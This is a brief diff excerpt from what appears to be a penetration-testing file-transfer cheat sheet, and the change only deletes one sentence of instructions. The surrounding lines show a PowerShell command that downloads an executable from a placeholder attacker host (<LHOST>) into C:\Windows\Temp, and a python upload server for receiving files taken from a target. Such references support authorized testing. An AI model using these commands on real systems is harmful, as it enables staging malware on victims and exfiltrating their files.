@@ -119,8 +119,6 @@ $wc.DownloadFile('http://<LHOST>:8000/file.exe','C:\Windows\Temp\file.exe')
 
 #### HTTP upload receiver
 
-Use an upload server you control, then send the file from the target.
-
 ```bash
 # Start an HTTP server that accepts uploaded files
 python3 -m uploadserver 8000
